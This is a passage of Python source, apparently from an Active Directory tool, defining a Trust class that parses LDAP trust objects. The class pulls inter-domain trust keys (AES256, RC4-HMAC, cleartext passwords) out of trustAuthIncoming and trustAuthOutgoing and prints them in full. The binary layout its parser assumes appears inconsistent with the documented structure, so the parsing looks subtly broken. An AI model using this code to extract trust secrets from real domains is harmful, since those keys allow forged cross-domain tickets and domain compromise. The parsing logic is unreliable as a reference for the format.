        if 'dn' in entry:
            self.dn = entry['dn']
        
        # Extract basic attributes
        attrs = entry.get('attributes', {})
        self.name = attrs.get('name', None)
        self.trust_partner = attrs.get('trustPartner', None)
        self.flat_name = attrs.get('flatName', None)
        self.trust_direction = attrs.get('trustDirection', None)
        self.trust_type = attrs.get('trustType', None)
        self.trust_attributes = attrs.get('trustAttributes', None)
        self.when_created = attrs.get('whenCreated', None)
        self.when_changed = attrs.get('whenChanged', None)
        
        # Process security identifier
        if 'securityIdentifier' in attrs:
            try:
                self.security_identifier = format_sid(attrs['securityIdentifier'])
            except Exception as e:
                LOG.error(f"Error parsing securityIdentifier: {str(e)}")
        
        # Process security descriptor
        if 'nTSecurityDescriptor' in attrs:
            try:
                sec_desc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=attrs['nTSecurityDescriptor'])
                if sec_desc['OwnerSid']:
                    self.owner_sid = sec_desc['OwnerSid'].formatCanonical()
            except Exception as e:
                LOG.error(f"Error parsing security descriptor: {str(e)}")
        
        # Process trust keys
        if 'trustAuthIncoming' in attrs and attrs['trustAuthIncoming']:
            try:
                # Get raw data
                auth_in = attrs['trustAuthIncoming']
                if isinstance(auth_in, list) and auth_in:
                    auth_in = auth_in[0]
                self.incoming_keys_raw = auth_in
                
                # Parse the data
                self.incoming_keys = self._parse_auth_data(auth_in)
            except Exception as e:
                LOG.error(f"Error parsing trustAuthIncoming: {str(e)}")
                import traceback
                LOG.debug(traceback.format_exc())
        
        if 'trustAuthOutgoing' in attrs and attrs['trustAuthOutgoing']:
            try:
                # Get raw data
                auth_out = attrs['trustAuthOutgoing']
                if isinstance(auth_out, list) and auth_out:
                    auth_out = auth_out[0]
                self.outgoing_keys_raw = auth_out
                
                # Parse the data
                self.outgoing_keys = self._parse_auth_data(auth_out)
            except Exception as e:
                LOG.error(f"Error parsing trustAuthOutgoing: {str(e)}")
                import traceback
                LOG.debug(traceback.format_exc())
    
    def _parse_auth_data(self, auth_data):
        """
        Parse the binary trustAuthIncoming/trustAuthOutgoing data
        
        The structure is:
        - Version (2 bytes)
        - Count (2 bytes) - number of entries
        - Entries array where each entry contains:
            - Type (4 bytes) - type of auth data
            - Time (8 bytes) - timestamp
            - Data (variable length) - the actual key material
            
        Returns:
            List of dictionaries with parsed key information
        """
        if not auth_data:
            return []
            
        entries = []
        try:
            pos = 0
            version = int.from_bytes(auth_data[pos:pos+2], byteorder='little')
            pos += 2
            count = int.from_bytes(auth_data[pos:pos+2], byteorder='little')
            pos += 2
            
            for _ in range(count):
                entry = {}
                entry['Version'] = version
                
                # Get auth type
                auth_type = int.from_bytes(auth_data[pos:pos+4], byteorder='little')
                entry['AuthType'] = auth_type
                pos += 4
                
                # Get timestamp
                timestamp = int.from_bytes(auth_data[pos:pos+8], byteorder='little')
                entry['Timestamp'] = self._windows_time_to_datetime(timestamp)
                pos += 8
                
                # Determine auth data length and get the data
                if auth_type == self.TRUST_AUTH_TYPE_VERSION:
                    # Version structure for AES keys
                    auth_data_len = 12 + 32  # Header (12) + AES256 key (32)
                    raw_data = auth_data[pos:pos+auth_data_len]
                    
                    # Extract fields from VERSION structure
                    version_size = int.from_bytes(raw_data[0:2], byteorder='little')
                    version_type = int.from_bytes(raw_data[2:4], byteorder='little')
                    version_current = int.from_bytes(raw_data[4:8], byteorder='little')
                    version_previous = int.from_bytes(raw_data[8:12], byteorder='little')
                    
                    entry['KeyType'] = 'AES256' if version_size == 32 else f'Unknown-{version_size}'
                    entry['VersionType'] = version_type
                    entry['VersionCurrent'] = version_current
                    entry['VersionPrevious'] = version_previous
                    
                    # Get the actual key material (skip the header)
                    key_material = raw_data[12:12+version_size]
                    entry['Key'] = key_material.hex()
                    
                elif auth_type in [self.TRUST_AUTH_TYPE_CLEAR_NT_ONLY, self.TRUST_AUTH_TYPE_CLEAR_BOTH]:
                    # RC4-HMAC key
                    auth_data_len = 16  # RC4-HMAC key (16 bytes)
                    key_material = auth_data[pos:pos+auth_data_len]
                    entry['KeyType'] = 'RC4-HMAC'
                    entry['Key'] = key_material.hex()
                    
                elif auth_type == self.TRUST_AUTH_TYPE_CLEAR_PW:
                    # UTF-16 encoded password
                    # Need to find null terminator
                    start = pos
                    while pos < len(auth_data):
                        if auth_data[pos:pos+2] == b'\x00\x00':
                            pos += 2  # Include null terminator
                            break
                        pos += 2
                    
                    auth_data_len = pos - start
                    password_bytes = auth_data[start:pos]
                    try:
                        entry['KeyType'] = 'Password'
                        entry['Key'] = password_bytes.decode('utf-16-le')
                    except:
                        entry['KeyType'] = 'Password (binary)'
                        entry['Key'] = password_bytes.hex()
                else:
                    # Unknown type, grab a reasonable amount of data
                    auth_data_len = 16  # Default size
                    entry['KeyType'] = f'Unknown-{auth_type}'
                    entry['Key'] = auth_data[pos:pos+auth_data_len].hex()
                
                pos += auth_data_len
                entries.append(entry)
                
        except Exception as e:
            LOG.error(f'Error parsing auth data: {str(e)}')
            import traceback
            LOG.debug(traceback.format_exc())
            
        return entries
    
    def _windows_time_to_datetime(self, windows_time):
        """Convert Windows filetime to Python datetime"""
        try:
            # Windows time is in 100-nanosecond intervals since January 1, 1601
            # Need to convert to seconds and adjust for the epoch difference
            seconds_since_1601 = windows_time / 10000000
            epoch_diff = 11644473600  # Seconds between 1601-01-01 and 1970-01-01
            unix_time = seconds_since_1601 - epoch_diff
            
            # Convert to datetime
            return datetime.datetime.fromtimestamp(unix_time).isoformat()
        except:
            return str(windows_time)
    
    def has_incoming_keys(self):
        """Check if the trust has incoming keys"""
        return len(self.incoming_keys) > 0
    
    def has_outgoing_keys(self):
        """Check if the trust has outgoing keys"""
        return len(self.outgoing_keys) > 0
    
    def get_latest_key(self, key_type=None, direction="incoming"):
        """
        Get the most recent key of the specified type and direction
        
        Args:
            key_type: Type of key to get (e.g., 'AES256', 'RC4-HMAC')
            direction: 'incoming' or 'outgoing'
            
        Returns:
            Dictionary with key information or None if not found
        """
        keys = self.incoming_keys if direction.lower() == "incoming" else self.outgoing_keys
        
        if not keys:
            return None
            
        # If no key type specified, get the newest key of any type
        if key_type is None:
            return keys[0]
            
        for entry in keys:
            if entry.get('KeyType') == key_type:
                return entry
                
        return None
    
    def get_trust_direction_string(self):
        """Get a human-readable string for the trust direction"""
        if self.trust_direction is None:
            return "Unknown"
            
        direction_map = {
            self.TRUST_DIRECTION_DISABLED: "Disabled",
            self.TRUST_DIRECTION_INBOUND: "Inbound",
            self.TRUST_DIRECTION_OUTBOUND: "Outbound",
            self.TRUST_DIRECTION_BIDIRECTIONAL: "Bidirectional"
        }
        
        return direction_map.get(self.trust_direction, f"Unknown ({self.trust_direction})")
    
    def get_trust_type_string(self):
        """Get a human-readable string for the trust type"""
        if self.trust_type is None:
            return "Unknown"
            
        type_map = {
            self.TRUST_TYPE_DOWNLEVEL: "Windows NT 4.0 or earlier (DOWNLEVEL)",
            self.TRUST_TYPE_UPLEVEL: "Windows 2000 or later (UPLEVEL)",
            self.TRUST_TYPE_MIT: "MIT Kerberos realm",
            self.TRUST_TYPE_DCE: "DCE realm"
        }
        
        return type_map.get(self.trust_type, f"Unknown ({self.trust_type})")
    
    def get_trust_attributes_list(self):
        """Get a list of trust attribute flags as strings"""
        if self.trust_attributes is None:
            return ["None"]
            
        attribute_map = {
            self.TRUST_ATTRIBUTE_NON_TRANSITIVE: "Non-Transitive",
            self.TRUST_ATTRIBUTE_UPLEVEL_ONLY: "Uplevel Only",
            self.TRUST_ATTRIBUTE_QUARANTINED_DOMAIN: "Quarantined Domain",
            self.TRUST_ATTRIBUTE_FOREST_TRANSITIVE: "Forest Transitive",
            self.TRUST_ATTRIBUTE_CROSS_ORGANIZATION: "Cross-Organization",
            self.TRUST_ATTRIBUTE_WITHIN_FOREST: "Within Forest",
            self.TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL: "Treat as External",
            self.TRUST_ATTRIBUTE_USES_RC4_ENCRYPTION: "Uses RC4 Encryption"
        }
        
        result = []
        for flag, name in attribute_map.items():
            if self.trust_attributes & flag:
                result.append(name)
                
        return result if result else ["None"]
    
    def to_dict(self):
        """Return a dictionary representation of the trust"""
        return {
            'DistinguishedName': self.dn,
            'Name': self.name,
            'TrustPartner': self.trust_partner,
            'FlatName': self.flat_name,
            'TrustDirection': {
                'Value': self.trust_direction,
                'Name': self.get_trust_direction_string()
            },
            'TrustType': {
                'Value': self.trust_type,
                'Name': self.get_trust_type_string()
            },
            'TrustAttributes': {
                'Value': self.trust_attributes,
                'Flags': self.get_trust_attributes_list()
            },
            'WhenCreated': self.when_created,
            'WhenChanged': self.when_changed,
            'SecurityIdentifier': self.security_identifier,
            'OwnerSid': self.owner_sid,
            'IncomingTrustKeys': self.incoming_keys,
            'OutgoingTrustKeys': self.outgoing_keys
        }
    
    def __str__(self):
        """Return a human-readable string representation of the trust"""
        result = f"Trust: {self.name}\n"
        result += f"  Distinguished Name: {self.dn}\n"
        result += f"  Trust Partner: {self.trust_partner}\n"
        result += f"  Trust Direction: {self.get_trust_direction_string()}\n"
        result += f"  Trust Type: {self.get_trust_type_string()}\n"
        result += f"  Trust Attributes: {', '.join(self.get_trust_attributes_list())}\n"
        result += f"  Security Identifier: {self.security_identifier}\n"
        result += f"  Owner SID: {self.owner_sid}\n"
        
        if self.has_incoming_keys():
            result += "  Incoming Trust Keys:\n"
            for i, key in enumerate(self.incoming_keys):
                result += f"    Key {i+1}: {key.get('KeyType', 'Unknown')}, {key.get('Timestamp', 'N/A')}\n"
                result += f"      Value: {key.get('Key', 'N/A')}\n"
        else:
            result += "  Incoming Trust Keys: None\n"
            
        if self.has_outgoing_keys():
            result += "  Outgoing Trust Keys:\n"
            for i, key in enumerate(self.outgoing_keys):
                result += f"    Key {i+1}: {key.get('KeyType', 'Unknown')}, {key.get('Timestamp', 'N/A')}\n"
                result += f"      Value: {key.get('Key', 'N/A')}\n"
        else:
            result += "  Outgoing Trust Keys: None\n"
            
        return result

# For backward compatibility
TrustKeyInfo = Trust
